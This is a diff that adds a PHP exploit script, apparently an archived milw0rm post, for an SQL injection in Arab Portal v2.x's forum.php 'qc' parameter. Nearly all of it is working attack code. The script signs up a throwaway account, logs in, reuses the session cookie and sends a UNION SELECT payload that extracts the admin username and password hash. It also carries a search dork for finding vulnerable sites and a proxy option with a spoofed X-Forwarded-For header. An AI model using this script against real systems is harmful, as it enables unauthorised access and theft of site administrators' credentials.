@@ -1,0 +1,174 @@
+<?
+ 
+/*
+ 
+            [  Arab Portal v2.x (forum.php qc) SQL Injection Exploit  ]
+            
+        [-] Author        : rEcruit
+        [-] Mail            : recru1t@ymail.com
+        [-] Download   : http://arab-portal.net/download.php
+        
+        [-] Vuln in  ./forum.php  Line: 1503
+        
+            [code]
+ 
+                if((isset($apt->get[qc])) &&(!isset($apt->get[qp])))
+                {
+                   $qc = $apt->get[qc];  
+                   $result = $apt->query("select name,comment from rafia_comment where id='$qc'");
+                   $row = $apt->dbarray($result);
+                   $apt->row['quote'] = "\n\n\n[QUOTE]..... :".$row['name']."\n".$row['comment']."[/QUOTE]";
+                }
+ 
+            [/code]
+ 
+ 
+        [-] Debug :
+        
+            [code]
+                $qc = intval($apt->get[qc]);  
+            [/code]
+ 
+        [-] Note : Path to Control Panel   "/admin/" .
+        
+        [-] Condition : magic_quotes_gpc = Off
+ 
+*/
+ 
+    error_reporting(0);
+    ini_set("max_execution_time",0);
+    ini_set("default_socket_timeout",5);
+ 
+    function Usage()
+    {
+            print "\n\n";
+            print "/------------------------------------------------------------\\\n";
+            print "|    Arab Portal v2.x (forum.php qc) SQL Injection Exploit   |\n";
+            print "\------------------------------------------------------------/\n";
+            print "| [-] Author : rEcruit                                       |\n";
+            print "| [-] Mail   : recru1t@ymail.com                             |\n";
+            print "| [-] Greetz : Evil-Cod3r , BlaCK MooN , Fantastic Egypt     |\n";
+            print "|              ALL Sec-Sni.coM Members                       |\n";
+            print "\------------------------------------------------------------/\n";
+            print "| [-] Dork     : \"Powered by: Arab Portal v2\"                |\n";
+            print "| [+] Usage    : php Exploit.php HOST PATH Options           |\n";
+            print "| [-] HOST     : Target server (ip/hostname)                 |\n";
+            print "| [-] PATH     : Path to Arab Portal                         |\n";
+            print "| [-] Options  :                                             |\n";
+            print "|     =>Proxy  :(ex. 0.0.0.0:8080)                           |\n";
+            print "\------------------------------------------------------------/\n";
+            print "\n\n";
+ 
+        exit;
+    }
+ 
+    function Send($Packet,$Payload=false)
+    {
+        Global $host,$proxy;
+        
+        if(empty($proxy))
+        {
+            $Connect    = @fsockopen($host,"80") or die("[-] Bad Host .");
+        }else{
+            $proxy        = explode(":",$proxy);
+            $Connect    = @fsockopen($proxy[0],$proxy[1]) or die("[-] Bad Proxy .");
+        }
+ 
+                $Packet    .= "Host : {$host} \r\n";
+                $Packet    .= "X-Forwarded-For: 127.0.0.1\r\n";
+                $Packet    .= "Content-Type: application/x-www-form-urlencoded\r\n";
+                $Packet    .= "Content-Length: ".(strlen($Payload))."\r\n";
+                $Packet    .= "Connection: close\r\n\r\n";
+                $Packet    .= $Payload;
+            
+                fputs($Connect,$Packet);
+ 
+                while(!feof($Connect))  
+                $Response    .= @fgets($Connect,2048);
+ 
+                fclose($Connect);
+        
+        return $Response;
+    }
+    
+    function SignUp()
+    {
+    
+        GLOBAL $username,$password,$email,$host,$path;
+        
+            $Payload = "username={$username}&password={$password}&password2={$password}&email={$email}&email2={$email}&homepage=http://&viewemail=0&showemail=1&html_msg=0&usertheme=portal&spam=regnotspam&remain=279&post={$email}&left=279&I1.x=72&I1.y=6";
+            $Packet    .= "POST {$path}/members.php?action=insert HTTP/1.1 \r\n";
+            $Packet    .= "Referer: http://{$host}/{$path}/members.php?action=signup \r\n";
+    
+        return Send($Packet,$Payload);
+    }
+    
+    function Login_Packet()
+    {
+    
+        GLOBAL $username,$password,$host,$path;
+            
+            $Payload = "username={$username}&userpass={$password}";
+            $Packet    .= "POST {$path}/members.php?action=login HTTP/1.1 \r\n";
+            $Packet    .= "Referer: http://{$host}/{$path}/forum.php\r\n";
+ 
+        return Send($Packet,$Payload);
+    }
+ 
+    function SI_Packet()
+    {
+    
+        GLOBAL $host,$path,$cookie;
+            
+ 
+            $Packet    .= "GET {$path}/forum.php?action=addcomment&id=1&qc=-999'+UNION+ALL+SELECT+1,concat(0x313a3a,username,0x3a3a,password,0x3a3a)+FROM+rafia_users+where+userid='1 HTTP/1.1 \r\n";
+            $Packet    .= "Host : {$host} \r\n";
+            $Packet    .= "{$cookie} \r\n";
+            $Packet    .= "Referer: http://{$host}/{$path}/forum.php\r\n";
+            
+        return Send($Packet);
+    }
+    
+    function getCookie($Packet)
+    {
+            $lines    = explode("\r\n",$Packet);
+            for($i = 0; $i < sizeof($lines); $i++)
+            {
+                $line    = $lines[$i];
+                if(ereg("PHPSESSID=",$line))
+                {
+                    $cookie    = str_replace("Set-Cookie","Cookie",$line);
+                    break;
+                }
+            }
+        return $cookie;
+    }
+ 
+    
+    if ($argc < 3) Usage();
+ 
+    $host    = $argv[1];
+    $path    = $argv[2];
+    $proxy    = $argv[3];
+    
+        
+        $username    = "user".rand(0,10000);
+        $password    = "pwd".rand(0,10000);
+        $email        = "email".rand(0,10000)."@yahoo.com";
+        
+        
+        Print "\r\n[-] Connecting to {$host} .... \r\n\r\n";
+ 
+        SignUp();
+ 
+        $cookie    = getCookie(Login_Packet());
+ 
+        $data = split("::",SI_Packet());
+        
+        Print "[-] Username : $data[1]\r\n";
+        Print "[-] Password : $data[2]\r\n";
+            
+ 
+?>
+
+# milw0rm.com [2009-08-01]
